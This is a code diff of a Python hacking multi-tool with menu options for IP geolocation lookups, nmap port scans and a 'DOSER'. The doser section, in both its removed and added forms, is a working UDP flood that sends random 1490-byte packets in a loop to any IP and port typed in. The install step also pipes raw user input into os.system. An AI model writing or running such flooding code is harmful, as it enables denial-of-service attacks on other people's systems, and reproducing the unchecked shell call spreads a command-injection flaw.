@@ -1,15 +1,15 @@
 #################################################--import libraries and install if not installed--#################################################
 import subprocess, platform, random, string, time, sys, os, re, smtplib
 
+installing = input("is pip or pip3 installed?(pip/pip3)")
 try:
     import pyfiglet, json, pprint, nmap, whois, pyperclip, requests as rq, pyshorteners as ps
-    from tld import get_tld
 except ModuleNotFoundError:
     print("modules are not installed")
-    pipy = input("do u have pip or pip3 installed?(pip/pip3): ")
-    os.system(pipy+" pip install pyfiglet pyperclip requests python-whois python-nmap==0.6.1 pyshorteners==1.0.1")
-    print("Pls re-run the program :)")
+    os.system(installing+" install pyfiglet pyperclip requests python-whois python-nmap==0.6.1 pyshorteners==1.0.1")
+    print("Got An Error?, restart the program!")
 
+import pyfiglet
 if platform.system() == 'Windows':
     os.system("cls")
 else:
@@ -46,12 +46,17 @@ while ans:
         print(ascii_banner)
         print("					By CxllZ")
         ip = input("Enter Ip -->: ")
-        url = "http://ip-api.com/json/"+ip+"?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
-        response = urllib.request.urlopen(url)
-        data = response.read()
-        values = json.loads(data)
+        url1 = "http://ip-api.com/json/"+ip+"?fields=mobile,proxy,hosting"
+        url2 = "http://ipwhois.app/json/"+ip
+        response2 = urllib.request.urlopen(url2) 
+        response1 = urllib.request.urlopen(url1)
+        data2 = response2.read()
+        data1 = response1.read()
+        values2 = json.loads(data2)
+        values1 = json.loads(data1)
         print("NOT ACCURATE AS ALWAYS!")
-        pprint.pprint(values)
+        pprint.pprint(values1)
+        pprint.pprint(values2)
         print("NOT ACCURATE AS ALWAYS!")
     elif ans=="2":
 #################################################--NMAP PORT SCAN AND SET NMAP TO PATH--#################################################
@@ -305,41 +310,24 @@ while ans:
     elif ans=="10":
 ######################################--DOSER--#################################################
         import socket
-        from datetime import datetime
-        now = datetime.now()
-        hour = now.hour
-        minute = now.minute
-        day = now.day
-        month = now.month
-        year = now.year
-        ##############
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1490)
-        #############
-        ip = input ("IP Target : ")
-        port = input ("Port : ")
-        os.system("cls")
-        os.system("clear")
-        ascii_banner = pyfiglet.figlet_format("AttackStarting!")
-        print(ascii_banner)
-        print ("[                    ] 0% ")
-        time.sleep(1)
-        print ("[=====               ] 25%")
-        time.sleep(1)
-        print ("[==========          ] 50%")
-        time.sleep(1)
-        print ("[===============     ] 75%")
-        time.sleep(1)
-        print ("[====================] 100%")
-        time.sleep(2)
-        sent = 0
-        while True:
-            sock.sendto(bytes, (ip, int(port)))
-            sent = int(sent) + 1
-            port = int(port) + 1
-            print ("Sent %s packets to %s throught port:%s"%(sent,ip,port))
-            if port == 65534:
-                port = 1
+        timing = input("Enter time: ")
+        def doser(pingtime):
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            bytes = random._urandom(1490)
+            ip1 = input("Enter IP: ")
+            port1 = input("Enter port: ")
+            sent = 0
+            prevtime = int(round(float(time.time())))
+            while True:
+                sock.sendto(bytes, (ip1, int(port1)))
+                sent = int(sent) + 1
+                port = int(port1) + 1
+                if port == 65534:
+                    port = 1
+                if int(round(float(time.time())))-prevtime == pingtime:
+                    break
+
+        doser(int(timing))
     elif ans=="11":
 ######################################--EXIT--#################################################
         exit()
